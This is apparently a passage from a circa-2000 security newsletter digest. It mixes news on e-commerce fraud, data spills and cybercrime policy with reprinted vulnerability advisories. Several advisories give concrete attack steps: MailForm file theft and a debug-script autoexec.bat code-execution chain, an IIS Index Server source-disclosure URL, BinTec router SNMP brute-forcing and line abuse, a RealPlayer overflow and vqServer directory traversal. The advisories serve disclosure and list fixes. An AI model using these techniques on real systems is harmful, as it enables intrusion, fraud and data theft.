           * Encrypting all census data from the time it leaves a data
             scanning center via a secure telephone line until it arrives
             at the Census computer center in Bowie, Md.
      
           * Making three copies of the data and storing it in different
             vaults.
      
           * Providing backup systems at the Bowie computer center,
             including generators and air conditioners.
      
      The Census Bureaus precautions have gotten high marks from security
      experts inside and outside government
      
      "Census is using all of the proper security practices," said Richard
      Smith, vice president of federal operations at Internet Security
      Systems Inc. "I would guess the likelihood of someone getting in is
      small."

239.0 ISN:Visa program targets online fraud
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Visa program will target online fraud
      By Rachel Konrad
      Staff Writer, CNET News.com
      March 24, 2000, 1:10 p.m. PT
      URL: http://news.cnet.com/category/0-1007-200-1583717.html
      
      Online retailers will soon receive a list of formal recommendations from
      Visa aimed at helping merchants crack down on fraud. 
      
      Visa's "best-practices" guide, which will be released within the next
      several weeks, will be similar to those the credit card giant has created
      for catalog companies that accept credit cards by mail or telephone
      without signatures. But the newest guide will target e-commerce companies
      for the first time, with tips on how to minimize hacker attacks on
      databases and spot potentially fraudulent orders before products are
      shipped. 
      
      "Internet merchants haven't always come out of the old catalog business,
      and sometimes they have little experience in business," said Dave Richey,
      vice president for card operations at Visa. "They're often new and often
      focused on IPOs and other stuff. Communication between merchant and
      cardholder is key in avoiding misunderstandings." 
      
      For some e-tailers, Visa's security tips could be considered a case of
      "better late than never": Credit card fraud has marred several
      high-profile and relatively established online companies in recent months. 
      
      Expedia, Microsoft's online travel affiliate, announced earlier this month
      that it will record a fiscal third-quarter charge of $4 million to $6
      million to cover the cost of fraudulent transactions on its Web site. The
      Bellevue, Wash.-based company said stolen credit cards were used to book
      travel reservations. 
      
      In January, nearly 350,000 credit card numbers were stolen from music site
      CD Universe and posted online. A hacker going by the name "Maxus" claimed
      to have the numbers and tried to extort $100,000 from the Web site. 
      
      The focus on credit card fraud coincides with intense scrutiny of
      e-commerce companies by Wall Street investors, many of whom worry that
      security breaches could dent revenue. 
      
      Unlike credit card transactions at brick-and-mortar companies, in which
      the bank that issued the card is usually liable for fraudulent
      transactions, online merchants are typically forced to cover the losses. 
      
      The financial institution that issues a credit card assumes liability in
      about 75 percent of all fraudulent transactions, according to John
      Shaughnessy, senior vice president for risk management at Visa. But in
      "card-not-present" transactions--when transactions happen by mail,
      telephone or Internet and no signatures are obtained--merchants assume
      liability for roughly 90 percent of fraudulent transactions. 
      
      Although it's impossible to quantify how much money online merchants have
      lost to fraudulent charges, experts say the total as a percent of revenue
      is anywhere from 1 percent to 30 percent, depending on the retailer and
      industry. In general, computer and electronics vendors are more at risk
      for fraud than vendors of less-expensive items, such as books, videos or
      CDs. 
      
      "Security is going to be the critical issue," said Ben Sim, an expert on
      e-commerce for New York-based C.E. Unterberg Towbin. "A lot of these
      merchants don't understand the implications of fraud, and they're using
      home-grown solutions that simply don't work. If you're getting someone
      from Romania ordering $50,000 of books, the fraudulent transaction's not
      going to happen. But thieves are getting much more sophisticated, and
      merchants' security systems aren't necessarily getting better." 
      
      According to an Unterberg Towbin study in 1998, more than 50 percent of
      disputed (or potentially fraudulent) charges at the Visa European division
      came from Internet transactions. However, Net transactions represented
      only 2 percent of the division's total transaction volume. 
      
      Although many e-commerce executives downplay fraud, their attorneys and
      accountants don't. 
      
      "Security breaches that result in access to confidential information could
      damage our reputation and expose us to a risk of loss or liability," music
      retailer CDNow stated in a 10K filed with the Securities and Exchange
      Commission in 1998. "We may be required to make significant expenditures
      and expend considerable personnel effort to protect against security
      breaches or remedy problems caused by these breaches. We cannot assure
      that our security measures will prevent such breaches." 
      
      Other companies are even more blunt: 
      
      "We cannot assure you that our security measures will prevent security
      breaches, and such breaches could expose us to operating losses,
      litigation and possible liability," read a 10Q filed by Egghead.com last
      November. 
      
      Amazon.com stated in a fall 1999 10Q filing: "Computer viruses, physical
      or electronic break-ins, and similar disruptions could cause system
      interruptions, delays and loss of critical data and could prevent us from
      providing services and accepting and fulfilling customer orders. 
      
      "Although we have developed systems and processes to mitigate fraudulent
      credit card transactions, failure to prevent such fraud may impact our
      financial results." 
      
      Tom Holland, director of fraud detection and prevention for Amazon, said
      such warnings are worst-case scenarios, not daily concerns. 
      
      "Amazon's fraud losses in comparison to sales revenues--it's minuscule," 
      Holland said. "I can't tell you the dollar figure. It's large, but as a
      percentage of sales, it's insignificant." 
      
      Holland said the company is continually upgrading its security system and
      cooperating with law enforcement to tackle fraud. Amazon and the sheriff
      of Fairhope, Ala., just completed a case in which a ring of thieves were
      using card numbers secured from an online "hack shack" of credit card
      numbers to buy books. 
      
      "They'd go to a house for sale, rip down the for-sale sign, and have
      deliveries go there," Holland said. "They took us for $3,000, but we're
      getting it all back." 
      
      Although online credit card fraud can damage retailers, security experts
      say, Internet transactions are extremely safe for consumers. 
      
      Consumers whose cards are used fraudulently online rarely are responsible
      for the bills because they don't sign a receipt. In the physical world,
      consumers must pay up to $50 of fraudulent transactions if they fail to
      report a stolen card or carelessly distributed credit card information. 
      
      "The people who end up eating it are the merchants," said Paul Wasserman,
      chief executive of Internet shopping portal Ebates.com and a former
      high-tech crime prosecutor in Silicon Valley. "If you're a merchant
      exercising due diligence, you're supposed to be off the hook. But the
      reality is that most of the financial institutions don't let them off." 
      
      Many e-commerce executives complain of an adversarial relationship with
      issuing banks. Holland said that often, when Amazon calls banks to verify
      addresses, the company doesn't get help. 
      
      "They can be blas," Holland said of the issuing banks. "The e-commerce
      companies don't get any respect. We're Rodney Dangerfield."

240.0 ISN:GAO lists security bargains
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Agencies can cut their information systems security risks with
      low-cost and no-cost solutions, federal experts told Congress
      Wednesday.
      
      The General Accounting Office listed six steps that agencies can take
      to immediately cut down on their security risks:
      
      * Increase security awareness throughout the organization.
      * Ensure that existing controls are operating effectively.
      * Ensure that software patches are up-to-date.
      * Use automated scanning and testing tools to quickly identify
        vulnerabilities.
      * Expand the use of best practices throughout the agency.
      * Ensure that the most common vulnerabilities are addressed.
      
      In its security audits of agencies, including the departments of
      Defense and Veterans Affairs, GAO found that security controls are in
      place but that those controls are not being used correctly, said Jack
      Brock, director of governmentwide and defense information systems at
      the General Accounting Offices Accounting and Information Management
      Division.
      
      "Agencies are spending money for tools, but theyre not using those
      tools," Brock testified before the House Government Reform Committees
      Government Management, Information and Technology Subcommittee. "Tools
      are present, but theyre not turned on, theyre not monitored, youre not
      sure if theyre working or not."
      
      One agency that has incorporated many of GAOs low-cost solutions into
      its agencywide security policy is NASA, which has made many
      improvements in security since its GAO audit in 1998, Brock said.
      
      The agency has bought commercial off-the-shelf vulnerability analysis
      and scanning tools, but it is augmenting them with freeware and
      shareware tools from the Internet. NASA also has developed and
      distributed a list of its top 50 vulnerabilities and has built those
      into auditing tools at NASA centers so that they automatically scan
      for those weaknesses, testified David Nelson, NASAs deputy chief
      information officer.

      On the Web, diamonds can be a spammer's best friend.
      
      About 35,000 customer email and home addresses were exposed on
      adiamondisforever.com, an informational site about diamonds sponsored
      by De Beer's, CNET News.com has learned.
      
      Chad Yoshikawa, a Bay Area consultant, stumbled across the security
      hole today while searching for his home address through a search
      engine. The results turned up a little more than he bargained for.
      
      A Web page he found, pulled from the De Beer-sponsored site, lists the
      names, phone numbers, home and email addresses of people registered
      with the site, along with his own. Yoshikawa, who said his wife
      entered a diamond contest through the site, contacted a site
      administrator immediately because "it didn't look like they were too
      on top of things because it was hard to find the privacy policy."
      
      Jim Greene, system administrator for hosting company Luminant, replied
      in the email to Yoshikawa: "We have investigated and fixed the problem
      with the site. This area is not active on the site any longer."
      
      The security breach resembles several related "data spills" from Web
      sites. Last year, Butterball published the names and addresses of
      people who signed up to receive recipes via an online newsletter.
      Nissan also exposed a list of more than 24,000 email addresses of its
      potential buyers last year.
      
      "This kind of occurrence is all too frequent. (But) the De Beer's
      seems especially troublesome because it suggests access to high-net
      individuals," said Jason Catlett, president of Junkbusters, an online
      advocacy group.
      
      "Who knows how many people have noticed or downloaded the list before
      it came to the attention of the media." Catlett said.
      
      Greene said Yoshikawa and CNET News.com were the only ones to spot the
      file.
      
      "We have looked into the server logs and see no indications that
      anyone besides yourself and someone coming from C-Net accessed the
      files," he wrote.
      
      Adiamondisforever.com, which launched in November 1996, is part of The
      Diamond Information Center (DIC), a marketing service for De Beer's,
      one of the largest diamond producers and marketers in the world.
      
      The site's privacy policy stipulates that the company does not "make
      available the email addresses of those who access our site to other
      organizations or companies."

242.0 ISN:Cybersleuths want to hack bill of rights

      http://www.sfgate.com/cgi-bin/article.cgi?file=/chronicle/archive/2000/04/05/ED11338.DTL&type=tech_article
      
      JAMES P. PINKERTON, Newsday
      Wednesday, April 5, 2000
      2000 San Francisco Chronicle
      
      More than ever before, Americans are exercising their unalienable
      right to life, liberty and the pursuit of capital gains. But what
      happens when liberty jeopardizes life -- or the Dow Jones average? And
      what happens when the government jeopardizes liberty?
      
      On Tuesday, Sen. Jon Kyl, R-Ariz., convened the Senate Judiciary
      Subcommittee on Technology, Terrorism and Government Information to
      make the case for new legislation to protect the nation's
      ``information infrastructure.''
      
      And so began a familiar Washington ritual: Friendly lawmaker invites
      friendly bureaucrat to a hearing. Soon, a new law emerges that gives
      political credit to the lawmaker and a bigger budget to the
      bureaucrat. Kyl began the show with a declaration that ``denial of
      service'' hacker attacks on companies such as eBay, Yahoo and CNN
      should ``serve as a wake-up call about the need to protect our
      critical computer networks.'' Kyl added that ``the attacks contributed
      to a 258-point drop in the Dow Jones Industrial Average and halted a
      string of three days of consecutive record- high closes of the
      technology-laden Nasdaq Composite Index.''
      
      To deal with this problem, Kyl and Sen. Charles Schumer, D-N.Y., have
      co-sponsored S. 2092, which would modify the federal government's
      ``trap and trace'' authority, so that law enforcers would no longer
      need to obtain a search warrant in every jurisdiction through which a
      cyber- attack traveled.
      
      The first ``witness'' was FBI Director Louis Freeh. After praising Kyl
      and his legislation, he reminded his audience of how much the FBI was
      already doing to combat the scourge of cyber-crime. Freeh then used
      the forum to outline the FBI's entire cyber-agenda, covering everyone
      from virus-writers and intellectual property thieves to the ``Internet
      Black Tigers,'' a group ``reportedly affiliated with the Tamil
      Tigers'' of Sri Lanka. He further noted that unchecked Net-related
      stock fraud costs investors $1 million an hour.
      
      Only two more witnesses came after Freeh. One was Richard D. Pethia,
      who directs a federally funded cyber-security center within the
      Software Engineering Institute at Carnegie Mellon University in
      Pittsburgh. Not surprisingly, Pethia was 100 percent behind the joint
      Kyl-Freeh effort. The other witness was Harris N. Miller, president of
      the Information Technology Association of America, a Washington-based
      trade association. Miller was supportive but ambivalent; his worry
      seemed to be that high-tech trade secrets would spill into -- and then
      out of -- Uncle Sam's databases.
      
      But the real opposition to the Senate bill wasn't heard from
      because it wasn't invited to testify.
      
      One likely opponent is the Electronic Privacy Information Center, a
      Washington-based cyber-liberties group. ``This is very much a process
      being driven by the law-enforcement community,'' lamented Mark
      Rotenberg, the group's director.
      
      Another non-invitee was Solveig Singleton, director of information
      studies at the Cato Institute, a libertarian think tank in Washington.
      ``Law enforcement views the Fourth Amendment as the problem,'' she
      said. That's the piece of the Bill of Rights that protects ``persons,
      houses, papers and effects against unreasonable searches and
      seizures'' -- with no mention of e-mail. And so now, Singleton
      observed, the FBI wants to force manufacturers to ``build surveillance
      into technology,'' all but eliminating the need for search warrants.
      
      The dangers that Kyl and Freeh described are real, but so is the
      danger of a government's habitually stomping on privacy rights.
      History proves that basic rights are unalienable only when those who
      might alienate them are watched

243.0 ISN:Third laptop gets lifted
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      By JOHN KAY
      
      A SENIOR Army officer has had a laptop computer stolen from under his
      nose - the THIRD theft of sensitive files in a month.
      
      The 50,000-a-year (U.K.P.) lieutenant colonel fell victim to an
      opportunist thief at Heathrow Airport.
      
      Military top brass admitted last night the incident was "incredibly
      embarrassing".
      
      And they said that the soldier was facing an internal disciplinary
      probe. The robbery followed the loss of two security service laptops -
      one from an MI5 agent at a London Tube station and one from a drunken
      MI6 officer.
      
      After those thefts were revealed exclusively by The Sun, all
      Government departments were ordered to tighten precautions against
      crooks out to snatch computers.

244.0 ISN:Government suck rocks at busting computer criminals
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1005-200-1648223.html
      
      By The Associated Press
      Special to CNET News.com
      April 6, 2000, 10:05 a.m. PT
      
      STANFORD, Calif.--Threats from cyberterrorists have become almost
      routine at Oracle, the leading developer of database software.
      
      Last month, someone in Sudan tried to blackmail the Redwood Shores,
      Calif.-based company with a threat to break into its system unless it
      paid an undisclosed sum of money.
      
      A clear case for the FBI? Not at Oracle--or at hundreds of other
      high-tech victims of Internet cyberstalking.
      
      "We've notified them of a couple of threats, but we didn't expect them
      to take any action," said Bill Maimone, Oracle's vice president of
      server technologies. "It seems so unlikely that they'd be able to do
      something."
      
      As high-tech executives know, the Justice Department lacks the staff
      to investigate and prosecute most hackers. Many companies also are
      reluctant to undergo government scrutiny; they've got too many
      secrets.
      
      As a result, cybercriminals are breaking into or paralyzing Web sites
      with little fear of retribution, costing the industry hundreds of
      millions of dollars.
      
      At a Stanford University Law School conference on cybercrime
      yesterday, Attorney General Janet Reno pleaded for greater cooperation
      between the private and public sectors.
      
      "It seems to me that we all have a common goal--to keep the nation's
      computer network secure, safe and reliable," Reno told the assembled
      CEOs and prosecutors.
      
      Many company leaders were unconvinced.
      
      "High-tech businesses know they can't count on the Justice Department
      to handle their complaints," said John Palafoutas, a senior vice
      president of the American Electronics Association. "They know they
      must take care of their own security."
      
      For the past four years, the Clinton administration has asked Congress
      for additional staff to prosecute computer crime. To date, the answer
      has been a consistent refusal. There was just one cybercrime
      prosecution for every 50 private industry complaints in 1998,
      according to the latest Justice Department figures.
      
      "We're only able to respond to a limited number of the complaints we
      receive because we're starved for resources," said Associate Deputy
      Attorney General John Bentivoglio.
      
      While funding for prosecutors remains static, computer crime has
      quadrupled over the past three years, according to a survey by the FBI
      and San Francisco's Computer Security Institute.
      
      Of the hacking victims--most often corporations and government
      agencies--75 percent said it cost an average of $1 million per
      intrusion to investigate, repair and secure their systems.
      Corporations spent $7.1 billion in 1999 on security to protect
      themselves against cyberattacks, and the bill could reach $17 billion
      by 2003, according to Internet analysts at Aberdeen Group in Boston.
      
      Hackers know authorities are overwhelmed.
      
      Two months have passed with no arrests in the Feb. 8 electronic
      assault that crippled Web sites at 10 major computer companies,
      including Silicon Valley powerhouses eBay, Yahoo and E*Trade.
      
      eBay, an Internet auction site with more than 4.1 million items up for
      sale at any given time, fights a constant battle against hacking,
      fraud and illegal deals.
      
      "We only take the most serious matters to the FBI. They investigated a
      few, but there haven't been any prosecutions," said eBay's general
      counsel, Robert Chesnut. "If the government is going to come out and
      vow action in these sorts of cases, they need to provide resources,
      not just the promises."
      
      Companies such as eBay and Oracle rely on the help of private
      consultants to combat hackers--a decision that also helps keep their
      problems from being publicized.
      
      "Information-sharing is a risky proposition with less than clear
      benefits," said Harris Miller, president of the Information Technology
      Association of America. "Companies are understandably reluctant to
      share sensitive proprietary information about prevention practices,
      intrusions and actual crimes with either government agencies or
      competitors."

245.0 CanSecWest/core00 Canadian Security Conf
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Unfortunately its out west and not here (southern Ont/Toronto) its what I
      was hoping to achieve with the failed CanCon (maybe we'll try it again
      with better planning this time and like oh I dunno SPONSORS? money sorta
      helps heh.) anyway ...I know Dragos has promo'd this to death but here's
      the details :)
      
      
      April 7, 2000
      
      CanSecWest/core00
                
      The CanSecWest/core2000 Conference is being held May 10-12th in Vancouver,
      BC, Canada. Featured speakers include Ken Williams, From Ernst and Young, 
      rain.forest.puppy from wiretrip.net and Fyodor, the author of nmap, from 
      insecure.org. 
      
      http://www.dursec.com/
      
      CanSecWest/core00
      May, 10th, 11th, 12th, 2000
      Vancouver, BC, Canada.

       "Every IT/Security person who can attend, should attend. CanSecWest/core00 
       promises to be the hardest hitting, most informative, and useful network 
       security event ever held in Canada." (Sounds familiar eh?)
      
       CanSecWest is the first in the core00 series of security tutorials. It assumes 
       a basic understanding of computing and is targeted at IT staff and managers who 
       require a "crash" course on advanced  computer security. If you administer 
       servers you -need- this knowledge to put yourself on an even footing with your 
       aggressors.
      
       Our goal is to arm our attendees with the basic core set of skills to create, 
       defend, and audit secure computer and server installations.
      
       This 2.5 day intensive training seminar will cover the most important modern 
       security issues facing e-commerce, networking, and system administration with 
       expert talks from some of the most noted and famous knowledgeable network 
       security "sensei" in the world.  This is your training academy for dealing with 
       the network intruders trying to prey on your computer - maybe even right now.
      
      
      
                              "Find out how they break in, how to stop them, and what 
                              they can do to try to evade you."
      
      
       The core00/CanSecWest conference will run on May 10-12, 2000*. The conference 
       will be at the Robson Conference Center which is situated under the Vancouver 
       Art Gallery next to the Law Court gardens in downtown Vancouver, BC, Canada..
      
       The seminar will be in an auditorium setting with live highspeed internet 
       access, and an adjoining lunch and display room. The center itself is situated 
       in the heart of downtown Vancouver, next to major hotels, shopping, Stanley 
       Park and several major transportation nexuses. Skiing or snowboarding at the 
       world renown Whistler resort is a 60 minute drive from downtown.
      
       Our objective is to pack the most comprehensive overview of security into 2.5 
       days we can. At the conclusion of this course attendees will leave with a 
       strong working base of critical security knowledge that can be applied to their 
       day-to-day work immediately.
      
      
      
      
      
      
                                                                   "The core00"
      
      
       The first day of introductory training will give the attendee the background on 
       terminology and technology to understand and effectively learn from the 
       security masters speaking during the second day.  The overall theme is similar 
       to a martial arts school, the first day is the basics and the second is notable 
       lectures from "Sensei".
      
      
      
       Noted speakers include:
      
       Ron Gula - Network Security Wizards 
      
            Famous ex-U.S. government computer security analyst, who founded Network

246.0 PSS:BeOs Network DoS
      ~~~~~~~~~~~~~~~~~~~~
      
      Sourced from Packetstorm
      http://packetstorm.securify.com/
      
       
      Problem:
        It is possible to crash the BeOS networking process.
      
      Discussion:
        The BeOS networking stack crashes when certain malformed packets
      are sent to it.  This document explains two such packets.  The
      first is an IP packet with the protocol field set to TCP.  If the
      IP length field is set to be shorter than 40, it will crash the
      networking process on reception.  Similarly, an IP packet with
      protocol field set to UDP with an IP length of less than 28 also
      crashes the stack.  The lengths 40 and 28 correspond with the
      minimum sizes of the IP and TCP headers, and the IP and UDP headers
      respectively.
      
        Because the networking stack is a seperate process in BeOS, it may
      be easily restarted after it crashes.
      
        A bug report has been filed with Be and assigned the bug number of
      20000405-18674.  Be has marked the bug as "Will Not Fix" with the
      comment "The entire networking system will be replaced soon."

      BinTec router security and privacy weakness
      
      
      Summary
      ===================
      
          By using SNMP brute-force-techniques for SNMP community-names one is able
          to gain the management accounts passwords, which are the same as the SNMP
          community names.
          Additionally the MIB-Tree holds security related information which should
          not be accessible through read-only/SNMP. These routers also offer services
          which can be abused rather easily, like dialing out and getting full line
          access via a CAPI interface, or a debugging interface which gives you all
          information which is sent over the BRI-lines.
          (Those services are open as default and the debugging service is barely
          documented)
      
      
      Systems Affected

      Impact
      ===================
      
      
          (1) SNMP communities / login passwords
          ___________________________________________________________________________
      
          By using standard brute-force methods, the SNMP community string, and
          therefore the login's passwords can be obtained. A program doing this
          is for example ADMsnmp, which has to be feeded by a wordlist. Bruteforcing
          this way is quite effective, you get about 500-1000 words per minute.
          (which of course depends on your and the routers connectivity) You can get
          this program from [4]. Bruteforcing the passwords directly via telnet isn't
          possible because the router slows down after approx. 6 tries.
      
      
          (2) Using the CAPI facility
          ___________________________________________________________________________
       
          Nearly any router can remotely be used as 'ISDN-Line provider' -  you can
          use the BRI-Lines of the router if they are not password protected.
          While doing a short survey most machines we encountered were proven
          to be vulnerable, so they didn't have any restrictions set. The CAPI
          daemon listens on port 6000 as you can see in the 'Tests' section.
          This feature can, for example be exploited by dialing expensive numbers
          (0900 or 0190 [in DE] lines). You may also hide your real identity by
          calling a 'call-by-call' ISP who gives you another IP you can deal with.
          A (R)CAPI library for Un*x exists, which can be used for these attacks.
          It is available via [5]. There is also a CAPI user interface for MS Windows,
          which is called Brickware and can be obtained via [6].
          Firmware before 5.1.x seems to be generally not passworded, we have not 
          checked 5.1.x yet.
      
      
          (3) Using BrickTrace for snooping BRI-Lines
          ___________________________________________________________________________
      
          You can gain information of the ISP or corporation running these routers
          with open BrickTrace ports (Port 7000, default) with a program called
          bricktrace, which is available via [7]. In the documentation this
          port isn't even stated (!). See 'Solution' for how to turn off this port.
          As you can see the whole data passing the line, so you also get the users
          passwords and see what they do in the net (it is in a way like a dedicated
          sniffer). Using this technique of sniffing you may also see private
          information of corporations, not only restricting you to Internet
          traffic but also on 'intranet' lines that use the same router, as well
          as telephony networks (S0 bus).
      
       
      Explanation
      ===================
      
          BinTec Communications seems to rely on security by obscurity. Neither the
          severity of these services, nor how to configure them are mentioned
          properly in their documentation.
          However, BinTec routers *can* be secured, it just seems not to be common
          knowledge.
          In addition to this, it seem to be quite useless to provide RCAPI
          facilities on a router which is mainly used for dial-in purposes. If one
          needs those abilities, encrypted management access would be appropriate.
      
      
      Solution
      ===================
      
          SNMP: disable (admin.biboAdmSnmpPort=0)
                        (admin.biboAdmSnmpTrapPort=0)
      
          RCAPI: disable or password protect
                        (admin.biboAdmCapiTcpPort=0)
      
          BrickTrace: disable
                        (admin.biboAdmTraceTcpPort=0)
      
          Just manage your Router through serial line, because if your connection
          gets sniffed, these services can be reactivated.

249.0 PSS:Advisory: MailForm v1.91 for Windows 95 and NT 4.0
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Advisory: MailForm v1.91 for Windows 95 and NT 4.0
      Chopsui-cide[MmM]
      The Mad Midget Mafia - http://midgets.box.sk/
      =======================================================================
      Do not save this with any editor, or _vital_ formatting may be lost.
      
      Disclaimer:
      =============
      This document is intended as an advisory, and I cannot be held
      accountable for its misuse. The reader assumes all responsibility for
      his/her use of this information.
      
      Summary:
      ==========
      Date released: 07/04/2000 (dd/mm/yyyy).
      Risk: denial of service, reading of private files, appending to
      private files, full system compromise if the afforementioned risks
      are leveraged properly.
      Vulnerability found by: Chopsui-cide
      Vulnerable: MailForm v1.91, probably prior versions (not tested).
      Immune: ?
      
      MailForm allows potentially dangerous parameters to be specified by
      anyone who can execute it. These allow for reading and writing of
      files on the system on which MailForm resides.
      
      Details:
      ==========
      Problem fields:
      _1_TextLog -
      _1_HTMLLog - these two are the ones used to write to files.
      _1_MailTemplate - this is what is used to retrieve files.
      _1_INIFile - possibly dangerous, but not discussed here.
      _1_MailServer - we can just change this to our own address.
      _1_MailTo - we don't even need to bother with this.
      
      It's fairly obvious where the problem lies here. We can specify any
      file to send + the POP server to send it to. The con\con bug may also
      be used to bring down the entire system. Template files will be cut
      off at the first null character, so retrieving of binaries is not
      practical. Trying to retrieve certain files will cause MailForm to
      crash.
      
      A very crude example of how to run code on the remote system is
      provided in the last section of this advisory.
      
      Implementation: web interface
      ===============================
      I have constructed some html that allows an attacker to download and
      append to files on any remote system running MailForm (cut where it
      says [snip], obviously):

      <title>Web interface for MailForm vulnerabilities.</title>
      </head>
      Do not be alarmed by any "Form submission failed" errors. These are
      normal. You will need to modify the form tags in this page to
      correspond to the host being attacked.<br>

      The e-mail will be sent to the host you specify on port 25. It should
      be easy enough to capture using netcat.
      
      Implementation: full compromise
      =================================
      When appending text to files, the following kind of ugly crap
      preceeds it:
      [snip]
      Submitted at Thu Apr 06 22:14:49 2000 from 192.168.1.1
      
      Name:
      [snip]
      Even with this handicap, we can still modify/create batch files.
      This is how we will execute code.
      
      The idea here is to create a kind of "script" for debug that will
      assemble and execute a small program. It is basically just a list of
      keystrokes. We then add an entry to autoexec.bat that executes it.
      Fist we need to upload the following file to c:\windows\script.txt
      [snip]
      
      a 100
      mov dx,10b
      mov ah,09
      int 21
      mov ah,4c
      int 21
      db "Code has been executed.",0d,0a,"$"
      
      g=100
      q
      [snip]
      
      Make sure at the end of each line there is _no_ carriage return. Each
      line should be terminated by \x0a (linefeed). Get rid of the carriage
      returns (\x0d), ie:
      a 100
      mov dx,10b
      mov ah,09
      int 21
      mov ah,4c
      int 21
      db "Code has been executed.",0d,0a,"$"
      
      g=100
      q
      
      
      Add a newline (\x0d,\x0a) before the above, and submit the two lines
      using the web-based interface.
      
      Add the following line to any batch file that is executed upon start-up
      (ie, autoexec.bat):
      debug < c:\windows\script.txt
      
      Check that everything is in order by trying to download both script.txt
      and the batch file you modified.
      
      Force a reboot using the con\con vulnerability. Once it restarts, the
      code will be executed. I know this is a really ugly hack, but it works
      (poor excuse). Also, make sure the garbage doesn't interfere with
      anything (always put a newline before the start of your commands).

      Cerberus Information Security Advisory (CISADV000330)
      http://www.cerberus-infosec.co.uk/advisories.shtml
      
      Released               : 30th March 2000
      Name                   : Index Server (Strike 3!)
      Affected Systems : Microsoft Internet Information Server
      Issue                   : Attackers can gain source of ASP and other pages
      Author                  : David Litchfield (mnemonix@globalnet.co.uk)
      
      Description
      ***********
      The Cerberus Security Team has found a third issue with Microsoft's Index
      Server that
      affects any web site running Internet Information Server 4 or 5 with Index
      Server
      even if the recent Index Server patch has been installed and even if no .htw
      files exist on the file system. These systems are at risk from having the
      source
      of ASP pages or other files such as the global.asa being revealed. Often
      these
      files contain sensitive information such as user IDs and passwords and
      database
      source names that are of use to an attacker attempting to break into a
      site/network.
      
      
      Details
      *******
      If a request is made to
      http://charon/null.htw?CiWebHitsFile=/default.asp&CiRestriction=none&CiHilit
      eType=Full
      only the HTML a user would normally see is returned. However by appending a
      %20 to the
      end of the CiWebHitsFile parameter:
      http://charon/null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHi
      liteType=Full
      it is possible to get the full source.
      
      Part of the problem exists because 'null.htw' is not a real file that maps
      to any file
      on the file system, rather it is a 'virtual file' held in memory so even if
      there are
      no real .htw files on the file system IIS boxes with Index Server will still
      be at risk.
      Any request made to null.htw is dealt with by webhits.dll.
      
      Solution
      ********
      If the functionality provided by webhits is need install Microsoft's patch.
      If the functionality is not needed, however, simply unmap the .htw extention
      from webhits.dll using the Internet Service Manager MMC snap-in.
      A check for this issue already exists in our security scanner, CIS.
      More details about CIS can be found on our web site:

253.0 PSS:Win32 Realplayer 6/7 Buffer Overflow
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  
      
      Win32 Realplayer 6/7 Buffer Overflow
      
      Vulnerability Summary:
      ----------------------
      There is a buffer overflow in the Win32 RealPlayer Basic client,
      versions 6 and 7.  This appears to occur when >299 characters
      are entered as a 'location' to play, such as http://aaaaa.....
      with 300 a's.  I have tested the MacOS and Linux Realplayer
      clients and have as yet not found such a vulnerability.
      
      Using the HTML "EMBED" tag to embed RealPlayer in a webpage
      and setting the "AUTOSTART=true" flag, you can force RealPlayer
      to start automatically, triggering the overflow condition.
      While I have not taken the time to find the proper entrance
      point in PNEN3260.DLL (which is what crashes, for example,
      in RealPlay 6 Basic), it appears that arbitrary code could
      be exploited simply by *VISITING* a webpage with the
      malicious embedded RealPlayer tags.
      
      (the following example is using RealPlayer v.6 Basic)
      
      In full effect, yo:
      -------------------
      For example: RealPlayer Win32 Version 6.0.7.380
      Type into "Location" http://aaaaaaaaaaa..... (300 a's)
      
      "This program has performed an illegal operation and will be shut
      down."
      REALPLAY caused an invalid page fault in
      module PNEN3260.DLL at 015f:6216d7ca.
      Registers:
      EAX=61616161 CS=015f EIP=6216d7ca EFLGS=00010202
      EBX=007c0158 SS=0167 ESP=00c6fe70 EBP=00c6fe88
      ECX=007c0350 DS=0167 ESI=007c0350 FS=629f
      EDX=00000001 ES=0167 EDI=007c0350 GS=0000
      Bytes at CS:EIP:
      ff 10 33 d2 f7 77 08 8b 47 04 8b 34 90 85 f6 8d
      Stack dump:
      007c0100 61616161 007c0350 007c0158 007c04d0 78009494 00c6fe9c
      6216d853 007c0100 007c0100 007c0100 00c6feac 6218407b 007c0100
      007c0100 00c6fed4
      
      Fun.   It looks like RealPlayer can be made to execute arbitrary
      code.  It gets worse, using the HTML EMBED tag for RealPlayer you
      can force a web browser (MSIE in this case) to crash as well.
      This is left as an exercise for the reader....
      
      Once you embed the RealPlayer in an html page, when Real crashes,
      it takes Internet Explorer with it...

      Risk Factor:            Low
      Attack Type:            Host Based
      
      The General Purpose Mouse (gpm) package is a tool to enable the mouse for
      cutting and pasting on consoles, which ships with several Linux
      distributions. Due to a design flaw in gpm-root, which causes the setgid
      call to fail, a local user with console access can obtain the group id
      that is running gpm-root (usually root).

      Risk Factor:            Medium
      Attack Type:            Host Based
      
      Microsoft Outlook contains a vulnerability that would allow a local user
      to view hidden drives. In Windows NT, an administrator can hide specific
      drives using systems policies, so that they cannot be accessed using My
      Computer, Windows NT Explorer, or the command prompt. However, the Insert
      File option in Microsoft Outlook reveals the hidden drives, allowing a
      user to copy, cut, paste, or delete files.

      Risk Factor:            Medium
      Attack Type:            Network/Host Based
      
      The vqServer program by vqSoft is a Java-based personal web server for
      cross-platform environments. Version 1.9.9 of vqServer, and possibly
      others, contains a vulnerability that would allow a user to traverse the
      directories by appending /........../ to a URL, then submitting to the
      server. This would allow a remote attacker to access any file on the
      system.

      The vqServer program by vqSoft is a Java-based personal web server for
      cross-platform environments. Version 1.9.9 of vqServer, and possibly
      others, stores server settings and passwords unencrypted. A remote user
      could access the password file, via a directory transversal vulnerability
      in the program, to obtain the administrator password and gain
      administrative rights to the server.

      Vulnerability:          iis-chunked-encoding-dos
      Platforms Affected:     Microsoft Internet Information Server 4.0
      Risk Factor:            Medium
      Attack Type:            Network/Host Based
      
      Microsoft Internet Information Server (IIS) 4.0 contains a vulnerability
      in its support for chunked encoding transfers, because it does not limit
      the size of these transfers. An attacker could consume memory on the
